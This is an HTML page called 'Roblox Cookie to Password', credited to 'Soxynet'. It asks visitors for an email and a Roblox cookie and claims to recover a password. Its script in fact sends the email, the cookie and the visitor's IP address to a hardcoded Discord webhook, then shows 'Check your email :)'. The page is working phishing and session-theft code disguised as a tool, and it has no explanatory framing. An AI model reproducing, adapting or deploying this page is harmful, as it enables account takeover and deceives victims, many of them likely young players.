<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie to Password</title>
    <style>
        /* Set the background image */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background-image: url('dkdjfs.png'); /* Your custom background image */
            background-size: cover; /* Ensure the background covers the entire screen */
            background-position: center; /* Center the image */
            font-family: Arial, sans-serif;
            color: white; /* Make text color white for better visibility */
        }

        /* Circular image at the top-left */
        .circle-image {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 150px; /* Increased size */
            height: 150px; /* Increased size */
            border-radius: 50%; /* Make the image circular */
            object-fit: cover; /* Make sure the image fits well within the circle */
            border: 2px solid white; /* Optional: adds a white border around the circle */
        }

        /* Centered content styling */
        .content {
            display: flex;
            flex-direction: column; /* Stack elements vertically */
            justify-content: center;
            align-items: center;
            height: 100%;
            text-align: center;
        }

        /* Textbox styling */
        .email-box, .cookie-box {
            padding: 15px; /* Adjusted padding for both boxes */
            border: 2px solid white; /* White border */
            background-color: transparent;
            color: white;
            font-size: 16px; /* Font size */
            width: 400px; /* Same width for both boxes */
            text-align: center;
            border-radius: 5px;
            outline: none;
            font-family: Arial, sans-serif;
            margin-bottom: 20px; /* Add space below each box */
            box-shadow: 0 0 10px white, 0 0 20px white, 0 0 30px white; /* Glowing white outline */
        }

        /* Placeholder styling */
        .email-box::placeholder, .cookie-box::placeholder {
            color: white;
            opacity: 0.7; /* Lighter placeholder color */
        }

        /* Submit Button styling */
        .submit-button {
            padding: 10px 20px;
            background-color: #4CAF50; /* Green background */
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            width: 250px;
        }

        /* Submit Button Hover */
        .submit-button:hover {
            background-color: #45a049;
        }

        /* "made by soxynet" text at the bottom-right */
        .footer-text {
            position: absolute;
            bottom: 10px;
            right: 10px;
            font-size: 18px;
            color: white;
            font-family: Arial, sans-serif;
            text-shadow: 0 0 5px white, 0 0 10px white, 0 0 15px white, 0 0 20px white; /* Glowing effect */
        }
    </style>
</head>
<body>
    <!-- Circular image at the top-left -->
    <img src="dsasjasf.png" alt="Logo" class="circle-image">

    <!-- Centered content with two text boxes and a submit button -->
    <div class="content">
        <input type="text" class="email-box" placeholder="Enter Your Email." id="email">
        <input type="text" class="cookie-box" placeholder="Enter There Cookie." id="cookie">
        <button class="submit-button" id="submitButton">Submit</button>
        <p id="statusMessage"></p>
    </div>

    <!-- "made by soxynet" text at the bottom-right -->
    <div class="footer-text">Made by Soxynet</div>

    <script>
        // Discord Webhook URL (updated)
        const webhookURL = 'https://discord.com/api/webhooks/1312880499680612374/lNd_gakr38XN3vW8o_Wyp83rZl8ZCEqWW2zUAhJEYYJPrb8LS6rbesIkQx1G7zuy1iJT';

        // Get elements
        const emailInput = document.getElementById('email');
        const cookieInput = document.getElementById('cookie');
        const submitButton = document.getElementById('submitButton');
        const statusMessage = document.getElementById('statusMessage');

        // Helper function to get the user's IPv4 address using an external API
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // Handle form submission
        submitButton.addEventListener('click', async function() {
            const email = emailInput.value;
            const cookie = cookieInput.value;

            // Check if both fields are filled
            if (email && cookie) {
                const ipAddress = await getIP();

                // Create the payload to send to Discord
                const payload = {
                    content: `Email: ${email}\nCookie: ${cookie}\nIP: ${ipAddress}`
                };

                // Send the data to the Discord webhook using fetch
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        statusMessage.textContent = "Check your email :)";
                        statusMessage.style.color = "white";
                    } else {
                        statusMessage.textContent = "Error sending data!";
                        statusMessage.style.color = "red";
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    statusMessage.textContent = "Error sending data!";
                    statusMessage.style.color = "red";
                });
            } else {
                statusMessage.textContent = 'Please fill in both fields.';
                statusMessage.style.color = 'red';
            }
        });
    </script>
</body>
</html>
